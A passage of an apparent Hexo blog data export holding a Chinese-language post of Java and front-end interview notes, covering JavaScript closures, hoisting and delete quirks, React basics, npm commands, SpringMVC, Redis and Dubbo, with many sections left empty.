https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/delete\n[3]: http://www.runoob.com/js/js-hoisting.html\n[4]: http://www.cnblogs.com/wang-meng/p/5861174.html#3896182\n[5]: http://www.cnblogs.com/wang-meng/p/5701918.html\n[6]: http://www.cnblogs.com/wang-meng/\n\n\n\n\n","source":"_posts/Java面试知识点总结.md","raw":"---\ntitle: Java面试知识点总结\ndate: 2018-02-01 14:22:30\ntags: 面试\n---\n[TOC]\n### JavaSE\n#### 多线程\n\n#### IO流\n#### 反射\n#### 集合\n\n[java基础面试][5]\n\n### 前台框架\n#### JavaScript\n1. **闭包**\n\n\t闭包是JavaScript中的一种语法现象，指的是在函数的内部定义了子函数，并且子函数访问了父函数中的成员变量。定义一个闭包现象如下：\n\t\n\t\tfout = function(){\n\t\t\tvar v1 = 10;\n\t\t\tfin = function(){\n\t\t\t\tvar v2 = v1;\n\t\t\t\treturn v2;\n\t\t\t}\n\t\t\treturn fin;\n\t\t}\n\t\t\n\t\tvar out = fout() //  fin()\n\t\tvar in = out() //  10\n\t通过闭包中的子函数可以访问到父函数中的成员变量但是外部的父函数却不能访问子函数中的成员变量，这就是Javascript语言特有的\"链式作用域\"结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立。\n\n\t既然fin可以读取fout中的局部变量，那么只要把fin作为返回值，我们不就可以在fout外部读取它的内部变量了吗！\n\n\n\n2.  **JavaScript 中 undefined 和 not defined 的区别:**\n\tundefined是javaScript中的一种原始数据类型，表示没有初始化的变量或者函数的初始化值。如果一个变量或者函数只定义了，而没有初始化，则用typeof会返回一个undefined。\n\n\t\tvar val;\n\t\talert(typeof val) // undefined\n\t\t\n\tnot defined是一种错误提示消息，表示变量没有定义过就使用了，如下：\n\t\t\n\t\tvar val = x; // x会报错: Unresolved variable or type x\n\n3. **全局对象**\n\tJavaScript的全局对象是指，该语言中的内置对象，这些对象可以在javaScript代码的任何位置不用声明就可以直接使用，类似Java中的基本类型数据。\n\t常用到的全局对象有：\n\t\n\t\teval(String)：接受一个字符串参数，用于执行字符串代码。\n\t\ttypeof： 返回一个变量的数据类型。\n\t\tNumber() ：把对象的值转换为数字。\n\t\tString()： 把对象的值转换为字串。\n\t\tparseInt(String)：解析一个字符串并返回一个整数。\n\t\tparseFloat(String)：解析一个字符串并返回一个浮点数。\n\t\tdecodeURI()：解码某个编码的 URI。\n\t\tdecodeURIComponent()：解码一个编码的 URI 组件。\n\t\tencodeURI()：把字符串编码为 URI。\n\t下面面试题输出的结果是甚末？\n\t\n\t\tvar y = 1;\n\t\tif (function f(){}) {\n\t\t    y += typeof f;\n\t\t}\n\t\tconsole.log(y);\n\t输出结果：1undefined\n\t\n4. **怎么判断一个object是否是数组(array)？**\n\n\t\tobject.__proto__ === Array.prototype; // 利用原型链\n\t\t\n\t\t$.isArray(object) // 利用jQuery\n\n5. **JavaScript怎么清空数组？**\n\n\t\tvar arr = [1, 2, 3, 4, 5];\n\t\tarr = []; // 方法一\n\t\tarr.length = 0; // 方法二 \n6. **JavaScript中自执行匿名函数**\t\n\n\t自执行匿名函数定义：\n\t常见格式：(function() { /* code */ })();\n\t解释：包围函数（function(){})的第一对括号向脚本返回未命名的函数，随后一对空括号立即执行返回的未命名函数，括号内为匿名函数的参数。\n\t作用：可以用它创建命名空间，只要把自己所有的代码都写在这个特殊的函数包装内，那么外部就不能访问，除非你允许(变量前加上window，这样该函数或变量就成为全局)。各JavaScript库的代码也基本是这种组织形式。\n\t\n\t总结一下，执行函数的作用主要为 匿名 和 自动执行,代码在被解释时就已经在运行了。\n\t\n\t下面代码输出的结果是甚末？\n\t\n\t\tvar output = (function(x){\n\t\t    delete x;\n\t\t    return x;\n\t\t})(0);\n\t\tconsole.log(output);\n输出是 0。 [delete][2] 操作符是将object的属性删去的操作。但是这里的 x 是并不是对象的属性， delete 操作符并不能作用。\n\n7. **什么是 undefined x 1 ？**\n\t在chrome下执行如下代码，我们就可以看到undefined x 1的身影。\n\t\n\t\tvar trees = [\"redwood\",\"bay\",\"cedar\",\"oak\",\"maple\"];\n\t\tdelete trees[3];\n\t\tconsole.log(trees);\n\t\t\n\t当我们使用 delete 操作符删除一个数组中的元素，这个元素的位置就会变成一个占位符。打印出来就是undefined x 1。\n\t注意如果我们使用trees\\[3] === 'undefined × 1'返回的是 false。因为它仅仅是一种打印表示，并不是值变为undefined x 1。\n\t\n8. **下面代码输出什么？**\n\n\t\tvar bar = true;\n\t\tconsole.log(bar + 0);   \n\t\tconsole.log(bar + \"xyz\");  \n\t\tconsole.log(bar + true);  \n\t\tconsole.log(bar + false);   \n\t输出是:\n\t1\n\ttruexyz\n\t2\n\t1\n\t\n\t下面给出一个加法操作表:\n\tNumber + Number -> 加法\n\tBoolean + Number -> 加法\n\tBoolean + Boolean -> 加法\n\tNumber + String -> 连接\n\tString + Boolean -> 连接\n\tString + String -> 连接\n\n9. **两种函数声明有什么区别？**\n\n\t\tvar foo = function(){ \n\t\t    // Some code\n\t\t}; \n\t\tfunction bar(){ \n\t\t    // Some code\n\t\t}; \n\t第一种函数定义是在运行时；第二种定义实在解析时，存在变量提升。看看如下代码的运行结果：\n\t\n\t\tconsole.log(foo)\n\t\tconsole.log(bar)\n\n\t\tvar foo = function(){ \n\t\t    // Some code\n\t\t}; \n\t\tfunction bar(){ \n\t\t    // Some code\n\t\t}; \n\t结果是：\n\t\t\n\t\tundefined\n\t\tfunction bar(){ \n\t\t    // Some code\n\t\t};\n\t第二种方式JavaScript在执行时，会将变量提升。\n\t\n10. [**JavaScript 变量提升**][3]\n\tJavaScript 中，函数及变量的声明都将被提升到函数的最顶部。\n\tJavaScript 中，变量可以在使用后声明，也就是变量可以先使用再声明。\n\t\n11. **内存泄漏**\n\t内存泄露是指变量使用完之后没有被销毁，一直常驻内存，无法被垃圾回收器回收导致的内存浪费，严重的时候会导致内存溢出。引发内存泄露的原因通常是因为不规范编码造成的。一般有一下几种现象：\n\t全局变量引起的内存泄漏：\n\t\n\t\tfunction leaks(){  \n\t\t    leak = 11; // leak 成为一个全局变量，方法执行完成之后，不会被回收\n\t\t}\n\t闭包引起的内存泄漏：\n\t\n\t\tfunction leaks(){\n\t\t\tlet leak = 11; // 被闭包所引用，不会被回收\n\t\t\tfunction fin() {\n\t\t\t\tconsole.log(leak); \n\t\t\t}\n\t\t\treturn fin();\n\t\t}\n\t事件未清除导致的内存泄漏\n\t\n#### jQuery\n1. **Ajax**\n\t简述ajax 的过程。\n\t\n\t- 创建XMLHttpRequest对象,也就是创建一个异步调用对象\n\t- 创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息\n\t- 设置响应HTTP请求状态变化的函数\n\t- 发送HTTP请求\n\t- 获取异步调用返回的数据\n\t- 使用JavaScript和DOM实现局部刷新\n\t\n同步和异步的区别?\nsyn\n如何解决跨域问题?\n\nJavaScript 的同源策略\n\n\t同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。所谓同源指的是：协议，域名，端口相同，同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性。\n解释jsonp的原理，以及为什么不是真正的ajax\n\n\tJsonp并不是一种数据格式，而json是一种数据格式，jsonp是用来解决跨域获取数据的一种解决方案，具体是通过动态创建script标签，然后通过标签的src属性获取js文件中的js脚本，该脚本的内容是一个函数调用，参数就是服务器返回的数据，为了处理这些返回的数据，需要事先在页面定义好回调函数，本质上使用的并不是ajax技术\n#### React\n1. **简介**\n\n\tReact是Facebook2013年开源的一个JavaScript项目，是用来构建UI界面的，相当于MVC模型中View层。React 拥有较高的性能，代码逻辑非常简单，越来越多的人已开始关注和使用它。\n\n2. **React主要的原理**\n\n\t传统的web应用，操作DOM一般是直接更新操作的，但是我们知道DOM更新通常是比较昂贵的。而React为了尽可能减少对DOM的操作，提供了一种不同的而又强大的方式来更新DOM，代替直接的DOM操作。就是Virtual DOM,一个轻量级的虚拟的DOM，就是React抽象出来的一个对象，描述dom应该什么样子的，应该如何呈现。通过这个Virtual DOM去更新真实的DOM，由这个Virtual DOM管理真实DOM的更新。\n\n\t为什么通过这多一层的Virtual DOM操作就能更快呢？ 这是因为React有个diff算法，更新Virtual DOM并不保证马上影响真实的DOM，React会等到事件循环结束，然后利用这个diff算法，通过当前新的dom表述与之前的作比较，计算出最小的步骤更新真实的DOM。\n\n3. **特点：**\n\t- 不直接操作DOM对象，而是通过虚拟DOM通过diff算法以最小的步骤作用到真实的DOM上；\n\t- 组件化开发，代码的复用性高；\n\t- 异步更新页面，不用刷新整个页面；\n4. **state, props, refs, keys的作用：**\n\t- state: 是React中组件的一个对象。React把用户界面当做是状态机，想象它有不同的状态然后渲染这些状态,可以轻松让用户界面与数据保持一致。 React中,更新组件的state,会导致重新渲染用户界面(不要操作DOM).简单来说,就是用户界面会随着state变化而变化。调用setState(data,callback)这个方法会合并、更新data到this.state，并重新渲染组件。渲染完成后，调用可选的callback回调。大部分情况不需要提供callback，因为React会负责吧界面更新到最新状态。\n\t\n\t- props: 用来从父级组件向子集组件传递参数的容器。React 里，数据通过props 从拥有者流向归属者。\n\n\t- ref: 是React中的一个特殊属性，这个属性用在render()方法返回的组件上，用来标记组件，以便于获取到该组件的实例。\n\tref的形式如下：\n\t```\n\t<input ref=\"myInput\" />\n\t```\n\t\t\n\t\t要想访问这个实例，可以通过this.refs来访问：\n\n\t\t\tthis.refs.myInput\n \n \t- key: 它是一个特殊的属性，它是出现不是给开发者用的（例如你为一个组件设置key之后不能获取组件的这个key props），而是给react自己用的。react利用key来识别组件，它是一种身份标识标识，就像我们的身份证用来辨识一个人一样。每个key对应一个组件，相同的key react认为是同一个组件，这样后续相同的key对应组件都不会被创建。\n \tkey值的唯一是有范围的，即在数组生成的同级同类型的组件上要保持唯一，而不是所有组件的key都要保持唯一。不仅仅在数组生成组件上，其他地方也可以使用key，主要是react利用key来区分组件的，相同的key表示同一个组件，react不会重新销毁创建组件实例，只可能更新；key不同，react会销毁已有的组件实例，重新创建组件新的实例。\n \t\n5. **定义一个组件：**\n\n\t\timport React from \"react\";\n\t\timport {Row,Col} from \"antd\";\n\t\timport \"antd/dist/antd.css\";\n\n\t\texport default class PCFooter extends React.Component{\n\t\t    render(){\n\t\t    \n\t\t\t\treturn(\n\t\t\t\t    <footer className={\"footer\"}>\n\t\t\t\t\t<Row>\n\t\t\t\t\t    <Col span={2}></Col>\n\t\t\t\t\t    <Col span={20}>\n\t\t\t\t\t\t<p>&copy;&nbsp;2017-2050 ReactNews CopyRight Reserved.</p>\n\t\t\t\t\t    </Col>\n\t\t\t\t\t    <Col span={2}></Col>\n\t\t\t\t\t</Row>\n\t\t\t\t    </footer>\n\t\t\t\t);\n\t\t    };\n\t\t}\n\n6. **AntD**\n\tAnt Design是蚂蚁金服开发的一款前端UI框架，可以帮助开发者快速搭建漂亮的页面，即使你是一个不懂设计的开发者，也能快速地写出比较好看的前端页面。从而提高了页面的开发效率。与React结合开发前端页面效果不错。\n7. **开发流程**\n\t- 导入需要的模块；\n\t- 定义一个组件，继承React.Component，用到关键字export, default, class, extends\n\t- 编写构造器（可选，用于初始化参数）;\n\t- 编写render()方法，用于渲染组件；\n\t- 编写render()方法中的return()方法，返回组件；\n\t- 在其他组件中导入编写的组件，用props进行参数传递。\n\t\n8. **NodeJS**\n\n\t简单的说 Node.js 就是运行在服务端的 JavaScript。自从前后端开发分离之后，前端代码从后段代码中剥离出来了，搭建独立的前端服务器，Node.JS就是前端项目服务器, 类似Tomcat、Apache、Nginx。\n\tNode.Js采用NPM对前端项目中的依赖JS包进行管理，在新版本中NPM已经包含在了Node.js中，用户只需要安装Node即可，不需要额外安装NPM。\n\t\n\t接下来我们使用 http.createServer() 方法创建服务器，并使用 listen 方法绑定 8888 端口。 函数通过 request, response 参数来接收和响应数据。\n\n实例如下，在你项目的根目录下创建一个叫 server.js 的文件，并写入以下代码：\n\n\tvar http = require('http');\n\n\thttp.createServer(function (request, response) {\n\n\t    // 发送 HTTP 头部 \n\t    // HTTP 状态值: 200 : OK\n\t    // 内容类型: text/plain\n\t    response.writeHead(200, {'Content-Type': 'text/plain'});\n\n\t    // 发送响应数据 \"Hello World\"\n\t    response.end('Hello World\\n');\n\t}).listen(8888);\n\n\t// 终端打印如下信息\n\tconsole.log('Server running at http://127.0.0.1:8888/');\n\t以上代码我们完成了一个可以工作的 HTTP 服务器。\n\n\t使用 node 命令执行以上的代码：\n\n\tnode server.js\n\tServer running at http://127.0.0.1:8888/\n\t\n\t\n9. **NPM**\n\t\n\t- npm init：会引导你创建一个package.json文件，包括名称、版本、作者这些信息等\n\t- npm install moduleNames：安装Node模块\n\t- npm install <name> -g： 将包安装到全局环境中\n\t- npm install <name> --save： 安装的同时，将信息写入package.json中项目路径中（如果有package.json文件时，直接使用npm install方法就可以根据dependencies配置安装所有的依赖包，这样代码提交到github时，就不用提交node_modules这个文件夹了）。\n\t- npm uninstall moudleName：卸载node模块\n\t- npm update moduleName：更新node模块\n\t- npm list：查看当前目录下已安装的node包\n\t- npm -v：查看npm安装的版本\n\t\n### 后台框架\n#### SpringMvc\n1. SpringMVC的工作流程？\n\n\t- 客户端发起请求到DispatcherServlet(前端控制器)；\n\t- 调用HandlerMapping(处理器映射器)，根据请求中的url到xml配置或注解(@RequestMapping)中去进行查找对应的Handler(处理器)；\n\t```\n\t<bean name=\"/url\" class=\"com.example.controller.Controller\"></bean> \n\t```\n\t- HandlerMapping 生成HandlerIntercepter(处理器拦截器)，将其和Handler一并返回给前端控制器；\n\t\n2. SpringMVC和Struts2的区别：\n3. \n#### Spring\n#### Mybatis\n#### Struts2\n#### Hibernate\n#### SpringBoot\n\n### 服务器\n#### Tomcat\n#### Nginx\n1. 简介\n2. Http服务器\n3. 负载均衡服务器\n[Nginx负载均衡的详细配置及使用案例详解.][4]\n4. 反向代理服务器\n\n\n### 数据库\n#### MySQL\n1. **Sql优化**\n2. **锁**\n\t死锁\n\t锁策略\n\t锁粒度\n\t\t表级锁\n\t\t行级锁\n3. **事务**\n\t原子性\n\t一致性\n\t持久性\n\t隔离性\n\t\t脏读\n\t\t不可重复读\n\t\t虚度/幻读\n\t\t序列化\n#### Redis\n1. **数据类型**\nRedis支持五种数据类型：string（字符串），hash（哈希），list（列表），set（集合）及zset(sorted set：有序集合)。\n2. **Jedis**\n\n3. **Redis与**\n\n4. **Redis的应用场景**\n\t- 缓存\n\t\tRedis读写速度每秒在10万次左右，可以对查询频繁的数据进行缓存，能实现高效的查询。\n\t- 技术器\n\t\t使用INCREABY和DECREABY可以实现计数器\n\t- 分布式锁与单线程 \n\t\tRedis是单线程的所以可以控制多线程并发访问资源的问题\n\t- 计时器\n\t\tRedis新版本推出了key过期事件，可以通过订阅指定的key事件来实现定时任务，但这是新版本的特性。\n#### MongoDB\n1. **数据类型**\n2. **JavaAPI**\n### 技术点\n#### Dubbo\nDubbo是阿里开源的一款微服务框架，可以与Spring整合实现分布式应用之间服务的管理。\nDubbo四个组件组成：\n- 生产者：服务的提供者；\n- 消费者：服务的订阅者；\n- 注册中心：用于服务的发布和订阅；\n\t通常使用Zookeeper作为注册中心，因为Zookeeper可以通过节点进行订阅和发布数据。\n- 监控中心：用于服务的监控和管理。\n#### ActiveMQ\n\n#### Zookeeper\n\t\n\t- Zookeeper最初时应用在大数据中的，被用于分布式系统中用于维护分布式应用配置的一致性。\n\t- 作为Dubbo的注册中心\n\t- 作为项目的配置中心\n\t首先动态加载相关bean，如果配置中心发生改变，对应的watcher监听到事件后，客户端则对相关bean进行重新注册，并且从配置中心获取到了最新数据，然后客户端直接调用getBean()方法获取相关bean实例，确保不再是之前引用。\n#### Freemarker\n#### SwaggerAPI\n#### Solr\n#### FastDFS\n#### 定时任务框架\n1. **JDK**\n2. **Spring-Task**\n3. **Quartz**\n4. [**Elestic Job**][1]\n5. **Zookeeper**\n\t\n#### WebService（CXF）\n#### Shiro\n\n### 开发工具\n#### IDEA\n#### PostMan\n#### Charles\n#### Datagrid\n#### Ubuntu\n#### GIT\n\n### 加分项\n#### Kotlin\n\n- 防止空指针\n- Kotlin文件类型有class, object, menu, interface\n- 伴生对象对应java中的static\n- 但例采用object \n- 高阶函数\n- Lambda表达式\n- 详见博客《Kotlin基础语法》\n#### Vertx\n- EvenBus异步执行，提高执行效率\n- 使用多层嵌套解决同步问题\n- 使用标签跳出指定层\n#### Python\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[1]: http://blog.csdn.net/fanfan_v5/article/details/61310045\n[2]: https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/delete\n[3]: http://www.runoob.com/js/js-hoisting.html\n[4]: http://www.cnblogs.com/wang-meng/p/5861174.html#3896182\n[5]: http://www.cnblogs.com/wang-meng/p/5701918.html\n[6]: http://www.cnblogs.com/wang-meng/\n\n\n\n\n","slug":"Java面试知识点总结","published":1,"updated":"2018-02-24T07:16:40.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tw0000umfah90ded0bi","content":"<p>[TOC]</p>\n<h3 id=\"JavaSE\"><a href=\"#JavaSE\" class=\"headerlink\" title=\"JavaSE\"></a>JavaSE</h3><h4 id=\"多线程\"><a href=\"#多线程\" class=\"headerlink\" title=\"多线程\"></a>多线程</h4><h4 id=\"IO流\"><a href=\"#IO流\" class=\"headerlink\" title=\"IO流\"></a>IO流</h4><h4 id=\"反射\"><a href=\"#反射\" class=\"headerlink\" title=\"反射\"></a>反射</h4><h4 id=\"集合\"><a href=\"#集合\" class=\"headerlink\" title=\"集合\"></a>集合</h4><p><a href=\"http://www.cnblogs.com/wang-meng/p/5701918.html\" target=\"_blank\" rel=\"noopener\">java基础面试</a></p>\n<h3 id=\"前台框架\"><a href=\"#前台框架\" class=\"headerlink\" title=\"前台框架\"></a>前台框架</h3><h4 id=\"JavaScript\"><a href=\"#JavaScript\" class=\"headerlink\" title=\"JavaScript\"></a>JavaScript</h4><ol>\n<li><p><strong>闭包</strong></p>\n<p> 闭包是JavaScript中的一种语法现象，指的是在函数的内部定义了子函数，并且子函数访问了父函数中的成员变量。定义一个闭包现象如下：</p>\n<pre><code>fout = function(){\n    var v1 = 10;\n    fin = function(){\n        var v2 = v1;\n        return v2;\n    }\n    return fin;\n}\n\nvar out = fout() //  fin()\nvar in = out() //  10\n</code></pre><p> 通过闭包中的子函数可以访问到父函数中的成员变量但是外部的父函数却不能访问子函数中的成员变量，这就是Javascript语言特有的”链式作用域”结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立。</p>\n<p> 既然fin可以读取fout中的局部变量，那么只要把fin作为返回值，我们不就可以在fout外部读取它的内部变量了吗！</p>\n</li>\n</ol>\n<ol start=\"2\">\n<li><p><strong>JavaScript 中 undefined 和 not defined 的区别:</strong><br>undefined是javaScript中的一种原始数据类型，表示没有初始化的变量或者函数的初始化值。如果一个变量或者函数只定义了，而没有初始化，则用typeof会返回一个undefined。</p>\n<pre><code>var val;\nalert(typeof val) // undefined\n</code></pre><p>not defined是一种错误提示消息，表示变量没有定义过就使用了，如下：</p>\n<pre><code>var val = x; // x会报错: Unresolved variable or type x\n</code></pre></li>\n<li><p><strong>全局对象</strong><br> JavaScript的全局对象是指，该语言中的内置对象，这些对象可以在javaScript代码的任何位置不用声明就可以直接使用，类似Java中的基本类型数据。<br> 常用到的全局对象有：</p>\n<pre><code>eval(String)：接受一个字符串参数，用于执行字符串代码。\ntypeof： 返回一个变量的数据类型。\nNumber() ：把对象的值转换为数字。\nString()： 把对象的值转换为字串。\nparseInt(String)：解析一个字符串并返回一个整数。\nparseFloat(String)：解析一个字符串并返回一个浮点数。\ndecodeURI()：解码某个编码的 URI。\ndecodeURIComponent()：解码一个编码的 URI 组件。\nencodeURI()：把字符串编码为 URI。\n</code></pre><p> 下面面试题输出的结果是甚末？</p>\n<pre><code>var y = 1;\nif (function f(){}) {\n    y += typeof f;\n}\nconsole.log(y);\n</code></pre><p> 输出结果：1undefined</p>\n</li>\n<li><p><strong>怎么判断一个object是否是数组(array)？</strong></p>\n<pre><code>object.__proto__ === Array.prototype; // 利用原型链\n\n$.isArray(object) // 利用jQuery\n</code></pre></li>\n<li><p><strong>JavaScript怎么清空数组？</strong></p>\n<pre><code>var arr = [1, 2, 3, 4, 5];\narr = []; // 方法一\narr.length = 0; // 方法二 \n</code></pre></li>\n<li><p><strong>JavaScript中自执行匿名函数</strong>    </p>\n<p> 自执行匿名函数定义：<br> 常见格式：(function() { /<em> code </em>/ })();<br> 解释：包围函数（function(){})的第一对括号向脚本返回未命名的函数，随后一对空括号立即执行返回的未命名函数，括号内为匿名函数的参数。<br> 作用：可以用它创建命名空间，只要把自己所有的代码都写在这个特殊的函数包装内，那么外部就不能访问，除非你允许(变量前加上window，这样该函数或变量就成为全局)。各JavaScript库的代码也基本是这种组织形式。</p>\n<p> 总结一下，执行函数的作用主要为 匿名 和 自动执行,代码在被解释时就已经在运行了。</p>\n<p> 下面代码输出的结果是甚末？</p>\n<pre><code>var output = (function(x){\n    delete x;\n    return x;\n})(0);\nconsole.log(output);\n</code></pre><p>输出是 0。 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/delete\" target=\"_blank\" rel=\"noopener\">delete</a> 操作符是将object的属性删去的操作。但是这里的 x 是并不是对象的属性， delete 操作符并不能作用。</p>\n</li>\n<li><p><strong>什么是 undefined x 1 ？</strong><br> 在chrome下执行如下代码，我们就可以看到undefined x 1的身影。</p>\n<pre><code>var trees = [&quot;redwood&quot;,&quot;bay&quot;,&quot;cedar&quot;,&quot;oak&quot;,&quot;maple&quot;];\ndelete trees[3];\nconsole.log(trees);\n</code></pre><p> 当我们使用 delete 操作符删除一个数组中的元素，这个元素的位置就会变成一个占位符。打印出来就是undefined x 1。<br> 注意如果我们使用trees[3] === ‘undefined × 1’返回的是 false。因为它仅仅是一种打印表示，并不是值变为undefined x 1。</p>\n</li>\n<li><p><strong>下面代码输出什么？</strong></p>\n<pre><code>var bar = true;\nconsole.log(bar + 0);   \nconsole.log(bar + &quot;xyz&quot;);  \nconsole.log(bar + true);  \nconsole.log(bar + false);   \n</code></pre><p> 输出是:<br> 1<br> truexyz<br> 2<br> 1</p>\n<p> 下面给出一个加法操作表:<br> Number + Number -&gt; 加法<br> Boolean + Number -&gt; 加法<br> Boolean + Boolean -&gt; 加法<br> Number + String -&gt; 连接<br> String + Boolean -&gt; 连接<br> String + String -&gt; 连接</p>\n</li>\n<li><p><strong>两种函数声明有什么区别？</strong></p>\n<pre><code>var foo = function(){ \n    // Some code\n}; \nfunction bar(){ \n    // Some code\n}; \n</code></pre><p> 第一种函数定义是在运行时；第二种定义实在解析时，存在变量提升。看看如下代码的运行结果：</p>\n<pre><code>console.log(foo)\nconsole.log(bar)\n\nvar foo = function(){ \n    // Some code\n}; \nfunction bar(){ \n    // Some code\n}; \n</code></pre><p> 结果是：</p>\n<pre><code>undefined\nfunction bar(){ \n    // Some code\n};\n</code></pre><p> 第二种方式JavaScript在执行时，会将变量提升。</p>\n</li>\n<li><p><a href=\"http://www.runoob.com/js/js-hoisting.html\" target=\"_blank\" rel=\"noopener\"><strong>JavaScript 变量提升</strong></a><br>JavaScript 中，函数及变量的声明都将被提升到函数的最顶部。<br>JavaScript 中，变量可以在使用后声明，也就是变量可以先使用再声明。</p>\n</li>\n<li><p><strong>内存泄漏</strong><br>内存泄露是指变量使用完之后没有被销毁，一直常驻内存，无法被垃圾回收器回收导致的内存浪费，严重的时候会导致内存溢出。引发内存泄露的原因通常是因为不规范编码造成的。一般有一下几种现象：<br>全局变量引起的内存泄漏：</p>\n<pre><code>function leaks(){  \n    leak = 11; // leak 成为一个全局变量，方法执行完成之后，不会被回收\n}\n</code></pre><p>闭包引起的内存泄漏：</p>\n<pre><code>function leaks(){\n    let leak = 11; // 被闭包所引用，不会被回收\n    function fin() {\n        console.log(leak); \n    }\n    return fin();\n}\n</code></pre><p>事件未清除导致的内存泄漏</p>\n</li>\n</ol>\n<h4 id=\"jQuery\"><a href=\"#jQuery\" class=\"headerlink\" title=\"jQuery\"></a>jQuery</h4><ol>\n<li><p><strong>Ajax</strong><br> 简述ajax 的过程。</p>\n<ul>\n<li>创建XMLHttpRequest对象,也就是创建一个异步调用对象</li>\n<li>创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息</li>\n<li>设置响应HTTP请求状态变化的函数</li>\n<li>发送HTTP请求</li>\n<li>获取异步调用返回的数据</li>\n<li>使用JavaScript和DOM实现局部刷新</li>\n</ul>\n</li>\n</ol>\n<p>同步和异步的区别?<br>syn<br>如何解决跨域问题?</p>\n<p>JavaScript 的同源策略</p>\n<pre><code>同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。所谓同源指的是：协议，域名，端口相同，同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性。\n</code></pre><p>解释jsonp的原理，以及为什么不是真正的ajax</p>\n<pre><code>Jsonp并不是一种数据格式，而json是一种数据格式，jsonp是用来解决跨域获取数据的一种解决方案，具体是通过动态创建script标签，然后通过标签的src属性获取js文件中的js脚本，该脚本的内容是一个函数调用，参数就是服务器返回的数据，为了处理这些返回的数据，需要事先在页面定义好回调函数，本质上使用的并不是ajax技术\n</code></pre><h4 id=\"React\"><a href=\"#React\" class=\"headerlink\" title=\"React\"></a>React</h4><ol>\n<li><p><strong>简介</strong></p>\n<p> React是Facebook2013年开源的一个JavaScript项目，是用来构建UI界面的，相当于MVC模型中View层。React 拥有较高的性能，代码逻辑非常简单，越来越多的人已开始关注和使用它。</p>\n</li>\n<li><p><strong>React主要的原理</strong></p>\n<p> 传统的web应用，操作DOM一般是直接更新操作的，但是我们知道DOM更新通常是比较昂贵的。而React为了尽可能减少对DOM的操作，提供了一种不同的而又强大的方式来更新DOM，代替直接的DOM操作。就是Virtual DOM,一个轻量级的虚拟的DOM，就是React抽象出来的一个对象，描述dom应该什么样子的，应该如何呈现。通过这个Virtual DOM去更新真实的DOM，由这个Virtual DOM管理真实DOM的更新。</p>\n<p> 为什么通过这多一层的Virtual DOM操作就能更快呢？ 这是因为React有个diff算法，更新Virtual DOM并不保证马上影响真实的DOM，React会等到事件循环结束，然后利用这个diff算法，通过当前新的dom表述与之前的作比较，计算出最小的步骤更新真实的DOM。</p>\n</li>\n<li><p><strong>特点：</strong></p>\n<ul>\n<li>不直接操作DOM对象，而是通过虚拟DOM通过diff算法以最小的步骤作用到真实的DOM上；</li>\n<li>组件化开发，代码的复用性高；</li>\n<li>异步更新页面，不用刷新整个页面；</li>\n</ul>\n</li>\n<li><p><strong>state, props, refs, keys的作用：</strong></p>\n<ul>\n<li><p>state: 是React中组件的一个对象。React把用户界面当做是状态机，想象它有不同的状态然后渲染这些状态,可以轻松让用户界面与数据保持一致。 React中,更新组件的state,会导致重新渲染用户界面(不要操作DOM).简单来说,就是用户界面会随着state变化而变化。调用setState(data,callback)这个方法会合并、更新data到this.state，并重新渲染组件。渲染完成后，调用可选的callback回调。大部分情况不需要提供callback，因为React会负责吧界面更新到最新状态。</p>\n</li>\n<li><p>props: 用来从父级组件向子集组件传递参数的容器。React 里，数据通过props 从拥有者流向归属者。</p>\n</li>\n<li><p>ref: 是React中的一个特殊属性，这个属性用在render()方法返回的组件上，用来标记组件，以便于获取到该组件的实例。<br>ref的形式如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input ref=&quot;myInput&quot; /&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<pre><code>   要想访问这个实例，可以通过this.refs来访问：\n\n       this.refs.myInput\n\n- key: 它是一个特殊的属性，它是出现不是给开发者用的（例如你为一个组件设置key之后不能获取组件的这个key props），而是给react自己用的。react利用key来识别组件，它是一种身份标识标识，就像我们的身份证用来辨识一个人一样。每个key对应一个组件，相同的key react认为是同一个组件，这样后续相同的key对应组件都不会被创建。\nkey值的唯一是有范围的，即在数组生成的同级同类型的组件上要保持唯一，而不是所有组件的key都要保持唯一。不仅仅在数组生成组件上，其他地方也可以使用key，主要是react利用key来区分组件的，相同的key表示同一个组件，react不会重新销毁创建组件实例，只可能更新；key不同，react会销毁已有的组件实例，重新创建组件新的实例。\n</code></pre><ol start=\"5\">\n<li><p><strong>定义一个组件：</strong></p>\n<pre><code>import React from &quot;react&quot;;\nimport {Row,Col} from &quot;antd&quot;;\nimport &quot;antd/dist/antd.css&quot;;\n\nexport default class PCFooter extends React.Component{\n    render(){\n\n        return(\n            &lt;footer className={&quot;footer&quot;}&gt;\n            &lt;Row&gt;\n                &lt;Col span={2}&gt;&lt;/Col&gt;\n                &lt;Col span={20}&gt;\n                &lt;p&gt;&amp;copy;&amp;nbsp;2017-2050 ReactNews CopyRight Reserved.&lt;/p&gt;\n                &lt;/Col&gt;\n                &lt;Col span={2}&gt;&lt;/Col&gt;\n            &lt;/Row&gt;\n            &lt;/footer&gt;\n        );\n    };\n}\n</code></pre></li>\n<li><p><strong>AntD</strong><br> Ant 